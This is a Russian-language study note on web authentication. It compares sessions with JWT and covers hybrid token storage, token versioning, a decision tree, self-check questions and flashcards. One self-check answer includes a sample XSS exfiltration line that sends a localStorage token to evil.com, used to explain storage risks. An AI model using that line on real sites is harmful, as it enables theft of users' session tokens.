Следующий пример демонстрирует клиентскую часть гибридного подхода: как управлять access token в памяти и автоматически обновлять его через refresh token в cookie.

```typescript
// Клиентская часть гибридного подхода
let accessToken: string | null = null;  // Только в памяти

async function apiCall(url: string, options: RequestInit = {}) {
  if (!accessToken) {
    // Первый запрос или после F5: получить новый AT
    accessToken = await refreshAccessToken();
  }

  const response = await fetch(url, {
    ...options,
    headers: {
      ...options.headers,
      'Authorization': `Bearer ${accessToken}`
    }
  });

  if (response.status === 401) {
    // AT истёк: обновить через RT в cookie
    accessToken = await refreshAccessToken();
    return fetch(url, { /* повторить с новым AT */ });
  }

  return response;
}

async function refreshAccessToken(): Promise<string> {
  // Cookie с RT отправляется автоматически (credentials)
  const res = await fetch('/auth/refresh', {
    method: 'POST',
    credentials: 'include'  // Включить cookies
  });
  const data = await res.json();
  return data.accessToken;   // Сохраняем только в переменную
}
```

Этот код демонстрирует ключевую идею гибридного подхода: access token никогда не покидает JavaScript-переменную (не записывается в localStorage и не попадает в cookie). Refresh token никогда не покидает httpOnly cookie (JavaScript его не видит). Параметр `credentials: 'include'` указывает `fetch` включить cookies в запрос, даже если они httpOnly -- браузер делает это автоматически, но JavaScript не может прочитать значение.

### Мобильные приложения

На мобильных платформах ситуация иная: нет JavaScript, нет XSS, но есть свои угрозы (root/jailbreak, reverse engineering).

**iOS Keychain** -- системное хранилище, защищённое аппаратным модулем Secure Enclave. Атрибут `kSecAttrAccessibleWhenUnlockedThisDeviceOnly` означает: токен доступен только когда устройство разблокировано, и не переносится на другие устройства при backup. Это наиболее безопасный вариант для iOS.

**Android Keystore** -- аппаратно-защищённое хранилище ключей. Начиная с Android 9+, ключи могут храниться в аппаратном модуле StrongBox. Для хранения токенов используется `EncryptedSharedPreferences`, который шифрует данные ключом из Android Keystore. Без root-доступа извлечь данные невозможно.

---

## Token versioning и blacklisting

### Версионирование токенов

Этот подход добавляет поле `tokenVersion` в запись пользователя в базе данных. При создании JWT текущая версия включается как claim. При проверке JWT сервер сравнивает версию в токене с версией в базе. Если пользователь нажал "Выйти со всех устройств", сервер увеличивает `tokenVersion` -- все существующие JWT с предыдущей версией мгновенно становятся недействительными.

Следующий код демонстрирует реализацию token versioning на серверной стороне: middleware, который добавляет одну проверку к стандартной верификации JWT.

```typescript
// Token versioning: мгновенный отзыв всех токенов
async function verifyWithVersion(token: string) {
  const payload = jwt.verify(token, SECRET, {
    algorithms: ['RS256']
  });

  // Дополнительная проверка: версия токена
  const user = await db.users.findById(payload.sub);
  if (payload.tokenVersion !== user.tokenVersion) {
    throw new Error('Token revoked');  // Версия не совпадает
  }

  return payload;
}

// При "выйти со всех устройств":
async function revokeAllTokens(userId: string) {
  await db.users.update(userId, {
    tokenVersion: db.raw('token_version + 1')
  });
}
```

Этот подход -- компромисс. Мы добавляем один запрос к базе данных при каждой верификации, частично теряя stateless-преимущество JWT. Но запрос лёгкий (SELECT одного поля по primary key), и его можно кэшировать в Redis с коротким TTL. Взамен мы получаем возможность мгновенного отзыва, которую чистый JWT не обеспечивает.

### Когда использовать

Token versioning оправдан в сценариях, требующих мгновенной реакции: security incidents (подозрение на компрометацию аккаунта), смена пароля (все старые токены должны стать недействительными), деактивация аккаунта (немедленный запрет доступа), изменение роли/привилегий (предотвращение использования старых привилегий).

---

## Sessions vs JWT: decision framework

### Сравнительная таблица

| Критерий | Sessions | JWT |
|----------|----------|-----|
| Состояние | На сервере (Redis, DB) | В токене (клиент) |
| Масштабирование | Нужен shared store | Stateless, любой сервер |
| Отзыв | Мгновенный (удалить session) | Невозможен без доп. механизмов |
| Размер | Cookie: 32-64 символа | 500+ байт в каждом запросе |
| Информация | Нет данных в cookie | Claims в payload (читаемы) |
| CSRF | Уязвимы (cookie auto-sent) | Не уязвимы (header manual) |
| XSS | Защищены (httpOnly cookie) | Уязвимы (если в localStorage) |
| Мобильные клиенты | Неудобно (нет cookie jar) | Удобно (заголовок) |
| Микросервисы | Нужен centralized store | Каждый сервис проверяет сам |
| Сложность | Простая реализация | Сложная (refresh, rotation, storage) |

### Дерево решений

```
Выбор механизма аутентификации:

                    ┌──────────────────────┐
                    │ Нужен мгновенный     │
                    │ отзыв сессии?        │
                    └──────────┬───────────┘
                          ┌────┴────┐
                         Да        Нет
                          │         │
                          ▼         ▼
                    ┌──────────┐ ┌──────────────┐
                    │ Sessions │ │ Микросервисы? │
                    │ + Redis  │ └──────┬───────┘
                    └──────────┘   ┌────┴────┐
                                  Да        Нет
                                   │         │
                                   ▼         ▼
                             ┌──────────┐ ┌──────────┐
                             │ JWT      │ │ Sessions │
                             │ (RS256/  │ │ подойдут │
                             │  ES256)  │ │ (проще)  │
                             └──────────┘ └──────────┘

Или гибрид:
  JWT access token (5-15 мин) +
  Opaque refresh token (httpOnly cookie) +
  Redis deny-list (для отзыва RT)
  = Лучшее из обоих миров
```

### Распространённые заблуждения

**"JWT всегда лучше sessions"** -- НЕВЕРНО. JWT сложнее в реализации (refresh tokens, rotation, storage, blacklisting), больше по размеру, не поддерживают мгновенный отзыв без дополнительных механизмов. Для монолитного веб-приложения с серверным рендерингом sessions + Redis -- проще, безопаснее и надёжнее. JWT оправдан в микросервисной архитектуре, где каждый сервис должен верифицировать токены независимо.

**"Sessions не масштабируются"** -- НЕВЕРНО. Sessions не масштабируются при in-memory хранении на одном сервере. С Redis Cluster sessions масштабируются горизонтально без ограничений. Redis обрабатывает 100,000+ операций в секунду на одном узле. Большинство приложений никогда не достигнут этого предела.

**"JWT безопаснее sessions"** -- НЕВЕРНО. JWT имеет другой набор уязвимостей, не меньший. Algorithm confusion, невозможность отзыва, утечка информации из payload, размер токена. Sessions уязвимы для CSRF, но это решается SameSite cookies. Безопасность определяется не выбором механизма, а качеством реализации.

**"Нужно выбирать или JWT, или sessions"** -- НЕВЕРНО. Гибридный подход (JWT access token + opaque refresh token + Redis deny-list) стал индустриальным стандартом. Auth0, Firebase, AWS Cognito, Supabase -- все используют гибридные схемы.

**"JWT -- это шифрование"** -- НЕВЕРНО. JWT (в форме JWS) -- это подпись, не шифрование. Payload доступен для чтения. Шифрование -- это JWE, который используется крайне редко.

---

## Когда НЕ применяются JWT

JWT не является универсальным решением. Существуют сценарии, в которых его использование создаёт больше проблем, чем решает.

**Серверный рендеринг (SSR) с минимальным JavaScript.** Если приложение рендерится на сервере (Rails, Django, Laravel, PHP), и клиент -- обычный браузер без SPA-фреймворка, то sessions -- естественный и простой выбор. Cookie отправляется автоматически, сервер проверяет session -- никакого JavaScript для управления токенами не нужно.

**Требование мгновенного отзыва без компромиссов.** Финансовые системы, медицинские приложения, системы с высокими требованиями compliance -- если при подозрении на компрометацию аккаунт должен быть заблокирован мгновенно, чистый JWT не подходит. Даже 5-минутное окно до истечения access token может быть неприемлемо.

**Внутренние сервисы в рамках одного дата-центра.** Если все сервисы находятся в одной сети и общаются через внутренний service mesh, mTLS (mutual TLS) может быть достаточен для аутентификации между сервисами. JWT добавляет сложность без выгоды.

**Встраиваемые системы и IoT с ограниченными ресурсами.** Криптографическая верификация JWT требует вычислительных ресурсов. На устройствах с ограниченным CPU и памятью простой API key или mTLS может быть предпочтительнее.

---

## Связь с другими темами

**[[authentication-authorization]]** -- обзорный файл, покрывающий AuthN vs AuthZ, OAuth 2.0 flows, RBAC/ABAC, хранение паролей. Текущий файл углубляет механизмы AuthN (sessions, JWT, opaque tokens), которые в обзоре описаны кратко. Порядок чтения: сначала обзор, потом этот deep-dive.

**[[auth-oauth2-oidc]]** -- OAuth 2.0 использует JWT как формат токенов (access token и id_token в OIDC -- это JWT). Понимание JWT-структуры из текущего файла необходимо для понимания того, что именно возвращает OAuth-провайдер.

**[[auth-api-service-patterns]]** -- паттерны аутентификации для API (API keys, service-to-service auth, gateway patterns). Опирается на знание JWT и opaque tokens из текущего файла. Порядок чтения: текущий файл → auth-api-service-patterns.

**[[security-cryptography-fundamentals]]** -- фундамент: HMAC, RSA, ECDSA, цифровые подписи. Без понимания криптографии алгоритмы подписи JWT (HS256, RS256, ES256) остаются "магией". Порядок чтения: криптография → текущий файл.

**[[security-https-tls]]** -- транспортная безопасность. JWT и session cookies передаются по сети. Без HTTPS (TLS) любой токен может быть перехвачен независимо от того, насколько безопасно он хранится на клиенте. TLS -- prerequisite для любого механизма аутентификации.

---

## Источники и дальнейшее чтение

- **Jones, M., Bradley, J. & Sakimura, N. (2015).** RFC 7519: JSON Web Token (JWT). IETF. -- Спецификация JWT. Определяет структуру, claims, требования к реализации. Первоисточник, к которому следует обращаться при любых вопросах о "правильном" поведении JWT.

- **Hardt, D. (2012).** RFC 6749: The OAuth 2.0 Authorization Framework. IETF. -- Определяет token flows (Authorization Code, Client Credentials, Refresh Token). Контекст для понимания того, как JWT используется в OAuth.

- **Auth0. (2024).** JWT Handbook. -- Практическое руководство: от структуры до best practices. Хорошее введение для тех, кто предпочитает практику перед спецификацией.

- **Ptacek, T. (2022).** "Stop Using JWT for Sessions". -- Аргументированная критика использования JWT вместо sessions. Разбирает конкретные сценарии, где JWT создаёт больше проблем. Обязательное чтение для баланса мнений.

- **Storer, T. et al. (2006).** "How the Web Was Won: The Impact of Cookies on E-Commerce". -- Историческое исследование влияния cookies на развитие электронной коммерции. Контекст для понимания, как технологическое решение 1994 года определило архитектуру веб-безопасности.

- **Barth, A. (2011).** RFC 6265: HTTP State Management Mechanism. IETF. -- Спецификация cookies. Определяет атрибуты Secure, HttpOnly, SameSite, Domain, Path. Первоисточник для понимания поведения cookies.

- **OWASP. (2025).** Session Management Cheat Sheet. -- Практические рекомендации по безопасному управлению сессиями: генерация ID, хранение, таймауты, защита от fixation.

---

## Проверь себя

> [!question]- Почему гибридный подход (JWT access token + opaque refresh token в httpOnly cookie) стал индустриальным стандартом, а не чистый JWT или чистые sessions?
> Чистый JWT не позволяет мгновенно отозвать токен -- злоумышленник с украденным токеном сохраняет доступ до истечения `exp`. Чистые sessions требуют обращения к серверному хранилищу при каждом запросе, что создаёт единую точку отказа и дополнительную латентность в микросервисах. Гибрид берёт лучшее: access token (JWT) проверяется без сетевых вызовов за счёт подписи, а refresh token (opaque, в httpOnly cookie) обеспечивает мгновенный отзыв через серверный store. Это архитектурный компромисс между производительностью (stateless валидация) и безопасностью (возможность отзыва).

> [!question]- Приложение использует RS256 для подписи JWT в микросервисной архитектуре. Один из сервисов скомпрометирован. Чем отличается масштаб ущерба при RS256 от HS256, и почему?
> При RS256 скомпрометированный сервис имеет только публичный ключ -- он может проверять токены, но не создавать новые. Злоумышленник не сможет выпустить поддельные JWT. При HS256 все сервисы используют один и тот же shared secret: компрометация любого сервиса позволяет создавать произвольные токены с любыми claims (ролями, правами). Разница в том, что асимметричные алгоритмы разделяют право подписи (приватный ключ у auth-сервиса) от права проверки (публичный ключ у остальных), реализуя принцип минимальных привилегий.

> [!question]- Как эволюция session storage (память -> файлы -> БД -> Redis) отражает общие паттерны масштабирования баз данных и распределённых систем?
> Эта эволюция повторяет фундаментальный путь любого stateful-компонента в распределённой системе. In-memory -- быстро, но не переживает рестарт и не шарится между узлами (как embedded DB). Файловая система добавляет персистентность, но не горизонтальное масштабирование (как SQLite). Реляционная БД решает обе проблемы, но добавляет латентность сетевого вызова и может стать узким местом (как централизованная СУБД). Redis/Memcached -- in-memory store с сетевым доступом и кластеризацией -- компромисс между скоростью RAM и доступностью по сети. Это тот же путь, по которому проходят кэши, очереди и любые shared state компоненты при масштабировании.

> [!question]- Разработчик хранит JWT в localStorage и утверждает, что это безопасно, потому что токен подписан и не может быть изменён. В чём ошибка его рассуждений?
> Подпись JWT защищает от подделки (модификации claims), но не от кражи. JWT -- это bearer token: доступ получает любой, кто им владеет, независимо от того, как он его получил. XSS-уязвимость на странице позволяет вредоносному скрипту прочитать localStorage и отправить токен на внешний сервер -- одной строкой `fetch('https://evil.com?t=' + localStorage.getItem('token'))`. Целостность данных (подпись) и конфиденциальность хранения (защита от кражи) -- два ортогональных свойства безопасности. httpOnly cookie защищает от XSS-кражи, потому что JavaScript не имеет доступа к его значению.

---

## Ключевые карточки

Что такое session-based authentication и где хранится состояние?
?
Session-based authentication -- stateful-подход, при котором сервер хранит данные о пользователе в серверном хранилище (Redis, БД), а клиент получает только session ID в cookie. Каждый запрос требует обращения к хранилищу для проверки.

Из каких трёх частей состоит JWT?
?
Header (алгоритм подписи и тип токена), Payload (claims -- данные о пользователе) и Signature (криптографическая подпись header + payload). Части разделены точками и закодированы в Base64URL.

Чем отличается HS256 от RS256 при подписи JWT?
?
HS256 -- симметричный алгоритм: один shared secret для подписи и проверки, все сервисы знают ключ. RS256 -- асимметричный: приватный ключ для подписи (только auth-сервис), публичный для проверки (все остальные). RS256 безопаснее для микросервисов.

Что такое algorithm confusion attack в JWT?
?
Атака, при которой злоумышленник подменяет алгоритм в header JWT (например, на "none" или с RS256 на HS256). Уязвимые библиотеки принимают алгоритм из токена на веру. Защита: явно указывать допустимые алгоритмы при верификации на стороне сервера.

Что такое opaque token и когда он предпочтительнее JWT?
?
Opaque token -- криптографически случайная строка без данных внутри, требующая серверной валидации. Предпочтителен, когда нужен мгновенный отзыв, недопустима утечка информации из payload, или уже есть централизованное хранилище.

Зачем нужна ротация refresh tokens?
?
При ротации каждый refresh token одноразовый: использование выдаёт новую пару (access + refresh), а старый RT аннулируется. Если злоумышленник перехватил RT, повторное использование уже аннулированного токена сигнализирует о компрометации, и сервер может отозвать всю token family.

Почему localStorage считается небезопасным для хранения JWT?
?
Любой JavaScript-код на странице имеет доступ к localStorage. XSS-уязвимость позволяет вредоносному скрипту прочитать и украсть токен. httpOnly cookie защищён от JavaScript-доступа и потому предпочтительнее для sensitive tokens.

Что такое CSRF-атака и почему она опасна именно для sessions?
?
CSRF -- Cross-Site Request Forgery: вредоносный сайт отправляет запрос к целевому домену, а браузер автоматически включает cookies. Sessions уязвимы, потому что session ID в cookie отправляется автоматически. JWT в заголовке Authorization добавляется вручную через JavaScript, поэтому не подвержен CSRF.

Как работает token versioning для отзыва JWT?
?
В базе данных хранится `tokenVersion` для каждого пользователя. При создании JWT версия включается как claim. При проверке сервер сравнивает версию в токене с версией в БД. Инкремент версии мгновенно аннулирует все ранее выданные токены.

Какой гибридный подход к хранению токенов в браузере стал стандартом?
?
Access token хранится в JavaScript-переменной (in-memory) -- защищён от XSS, но теряется при обновлении страницы. Refresh token хранится в httpOnly Secure SameSite cookie -- невидим для JS, переживает F5. При обновлении страницы cookie автоматически отправляется для получения нового access token.

---

## Куда дальше

| Направление | Файл | Зачем |
|-------------|------|-------|
| OAuth 2.0 и OIDC | [[auth-oauth2-oidc]] | Понять, как JWT используется внутри OAuth-потоков и что возвращает провайдер в id_token |
| API-аутентификация | [[auth-api-service-patterns]] | Изучить паттерны аутентификации между сервисами: API keys, mTLS, gateway auth |
| Криптографические основы | [[security-cryptography-fundamentals]] | Разобраться, как работают HMAC, RSA и ECDSA, лежащие в основе подписей JWT |
| TLS и транспортная безопасность | [[security-https-tls]] | Без HTTPS любой токен перехватывается, какой бы механизм ни использовался |
| AuthN vs AuthZ обзор | [[authentication-authorization]] | Вернуться к общей картине: как sessions и JWT вписываются в архитектуру безопасности |
| Redis как session store | [[databases-nosql-comparison]] | Углубить понимание Redis и его роли в хранении сессий и deny-list |

---

*Создано: 2026-02-11*
